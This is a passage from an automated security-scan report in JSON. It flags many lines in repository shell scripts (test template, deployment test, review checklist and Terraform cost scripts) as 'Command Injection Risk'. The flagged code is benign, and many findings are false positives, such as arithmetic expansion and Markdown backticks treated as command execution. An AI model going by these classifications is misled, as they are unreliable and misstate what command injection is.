        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 68,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") python Calculator --framework pytest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 71,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") typescript UserService --framework jest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 74,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") python OrderProcessor --style bdd",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 77,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") rust string_utils",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 80,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") go Validator",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 349,
        "issue": "Backtick command execution",
        "evidence": "it(\\`should return \\${expected}\\`, () => {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 713,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_python_pytest \"$NAME\" \"$STYLE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 719,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_typescript_jest \"$NAME\" \"$STYLE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 725,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_typescript_jest \"$NAME\" \"$STYLE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 728,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_rust_tests \"$NAME\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 731,
        "issue": "Command substitution in shell",
        "evidence": "content=$(generate_go_tests \"$NAME\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 742,
        "issue": "Command substitution in shell",
        "evidence": "output_file=\"$OUTPUT_DIR/$(basename \"$content\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 751,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_python_pytest \"$NAME\" \"$STYLE\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 754,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_typescript_jest \"$NAME\" \"$STYLE\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 757,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_rust_tests \"$NAME\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 760,
        "issue": "Command substitution in shell",
        "evidence": "template=$(generate_go_tests \"$NAME\" | tail -n +2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 156,
        "issue": "Command substitution in shell",
        "evidence": "start_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 159,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -s -w \"\\n%{http_code}\" --max-time \"$TIMEOUT\" \"$url\" 2>/dev/null || echo -e \"\\n000\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 161,
        "issue": "Command substitution in shell",
        "evidence": "end_time=$(date +%s%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 162,
        "issue": "Command substitution in shell",
        "evidence": "duration=$(( (end_time - start_time) / 1000000 )) # Convert to milliseconds",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 165,
        "issue": "Command substitution in shell",
        "evidence": "http_code=$(echo \"$response\" | tail -n 1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 167,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 170,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_LATENCY=$((TOTAL_LATENCY + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 183,
        "issue": "Command substitution in shell",
        "evidence": "TIMEOUTS=$((TIMEOUTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 184,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 186,
        "issue": "Command substitution in shell",
        "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|timeout|${duration}ms\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 190,
        "issue": "Command substitution in shell",
        "evidence": "SUCCESSFUL_REQUESTS=$((SUCCESSFUL_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 197,
        "issue": "Command substitution in shell",
        "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|server_error|${http_code}|${duration}ms\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 201,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 203,
        "issue": "Command substitution in shell",
        "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|client_error|${http_code}|${duration}ms\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 213,
        "issue": "Command substitution in shell",
        "evidence": "http_code=$(curl -s -o /dev/null -w \"%{http_code}\" --max-time \"$TIMEOUT\" \"$health_url\" 2>/dev/null || echo \"000\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 231,
        "issue": "Command substitution in shell",
        "evidence": "start_time=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 232,
        "issue": "Command substitution in shell",
        "evidence": "end_time=$((start_time + DURATION))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 247,
        "issue": "Command substitution in shell",
        "evidence": "while [[ $(date +%s) -lt $end_time ]]; do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "elapsed=$(($(date +%s) - start_time))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "concurrent_success=$((concurrent_success + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 262,
        "issue": "Command substitution in shell",
        "evidence": "concurrent_failed=$((concurrent_failed + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "if [[ $concurrent_failed -gt $((CONCURRENT_REQUESTS / 2)) ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 271,
        "issue": "Command substitution in shell",
        "evidence": "downtime_start=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 280,
        "issue": "Command substitution in shell",
        "evidence": "downtime_end=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 281,
        "issue": "Command substitution in shell",
        "evidence": "local downtime_duration=$((downtime_end - downtime_start))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 282,
        "issue": "Command substitution in shell",
        "evidence": "DOWNTIME_SECONDS=$((DOWNTIME_SECONDS + downtime_duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 295,
        "issue": "Command substitution in shell",
        "evidence": "downtime_end=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 296,
        "issue": "Command substitution in shell",
        "evidence": "local downtime_duration=$((downtime_end - downtime_start))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "DOWNTIME_SECONDS=$((DOWNTIME_SECONDS + downtime_duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "avg_latency=$((TOTAL_LATENCY / TOTAL_REQUESTS))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 315,
        "issue": "Command substitution in shell",
        "evidence": "success_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($SUCCESSFUL_REQUESTS / $TOTAL_REQUESTS) * 100}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "error_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($FAILED_REQUESTS / $TOTAL_REQUESTS) * 100}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 317,
        "issue": "Command substitution in shell",
        "evidence": "timeout_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($TIMEOUTS / $TOTAL_REQUESTS) * 100}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 326,
        "issue": "Command substitution in shell",
        "evidence": "metrics=$(calculate_metrics)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "\"downtime_percentage\": $(awk \"BEGIN {printf \\\"%.2f\\\", ($DOWNTIME_SECONDS / $DURATION) * 100}\"),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 349,
        "issue": "Command substitution in shell",
        "evidence": "\"zero_downtime\": $(if [[ $DOWNTIME_SECONDS -eq 0 ]]; then echo \"true\"; else echo \"false\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 351,
        "issue": "Command substitution in shell",
        "evidence": "$(printf '    \"%s\"' \"${ERRORS[@]}\" | paste -sd ',' -)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 377,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Percentage: $(awk \"BEGIN {printf \\\"%.2f\\\", ($DOWNTIME_SECONDS / $DURATION) * 100}\")%\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 378,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Zero-downtime: $(if [[ $DOWNTIME_SECONDS -eq 0 ]]; then echo \"${GREEN}YES${NC}\"; else echo \"${RED}NO${NC}\"; fi)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 422,
        "issue": "Command substitution in shell",
        "evidence": "if [[ $(awk \"BEGIN {print ($error_rate > 1.0)}\") -eq 1 ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 483,
        "issue": "Command substitution in shell",
        "evidence": "elif [[ $DOWNTIME_SECONDS -gt 60 ]] || [[ $FAILED_REQUESTS -gt $((TOTAL_REQUESTS / 10)) ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 120,
        "issue": "Command substitution in shell",
        "evidence": "**Date:** $(date -u +\"%Y-%m-%d %H:%M:%S UTC\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 280,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Context managers for resource management (`with` statements)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 281,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Exceptions used properly (not bare `except:`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 298,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `ruff check` passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 299,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `mypy` passes (if using type hints)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 300,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `bandit` security check passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 323,
        "issue": "Backtick command execution",
        "evidence": "- [ ] No `any` types (use unknown or proper types)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 338,
        "issue": "Backtick command execution",
        "evidence": "- [ ] No security vulnerabilities (`npm audit`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 347,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `cargo fmt` applied",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 348,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `cargo clippy` warnings addressed",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 385,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `gofmt` applied",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 386,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `go vet` passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 387,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `golangci-lint` passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 392,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Error handling explicit (no `_` without reason)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 405,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Race detector passes (`go test -race`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 479,
        "issue": "Command substitution in shell",
        "evidence": "\"generated_at\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 609,
        "issue": "Command substitution in shell",
        "evidence": "output=$(generate_checklist \"$PR_TYPE\" \"$LANGUAGE\" \"$OUTPUT_FORMAT\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 97,
        "issue": "Command substitution in shell",
        "evidence": "PLAN_FILE=\"tfplan-$(date +%s)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 170,
        "issue": "Command substitution in shell",
        "evidence": "\"timeGenerated\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 200,
        "issue": "Command substitution in shell",
        "evidence": "local type=$(echo \"$resource\" | jq -r '.type')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 201,
        "issue": "Command substitution in shell",
        "evidence": "local name=$(echo \"$resource\" | jq -r '.name')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 202,
        "issue": "Command substitution in shell",
        "evidence": "local instance_type=$(echo \"$resource\" | jq -r '.change.after.instance_type // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 211,
        "issue": "Command substitution in shell",
        "evidence": "total_monthly=$(echo \"$total_monthly + $cost\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "--arg resources \"$(printf '%s,' \"${resources[@]}\" | sed 's/,$//')\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 228,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_cost=$(jq -r '.totalMonthlyCost' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 229,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_diff=$(jq -r '.diffTotalMonthlyCost // \"0\"' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 230,
        "issue": "Command substitution in shell",
        "evidence": "local hourly_cost=$(jq -r '.totalHourlyCost' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 238,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Generated: $(date)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 244,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$monthly_diff > 0\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 265,
        "issue": "Command substitution in shell",
        "evidence": "local detected=$(jq -r '.summary.totalDetectedResources // 0' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 266,
        "issue": "Command substitution in shell",
        "evidence": "local supported=$(jq -r '.summary.totalSupportedResources // 0' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "local unsupported=$(jq -r '.summary.totalUnsupportedResources // 0' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "local threshold_amount=$(echo \"$BUDGET * $ALERT_THRESHOLD / 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 277,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_int=$(echo \"$monthly_cost\" | cut -d. -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 304,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Total,,$( jq -r '.totalMonthlyCost' infracost.json),$( jq -r '.totalHourlyCost' infracost.json)\"",
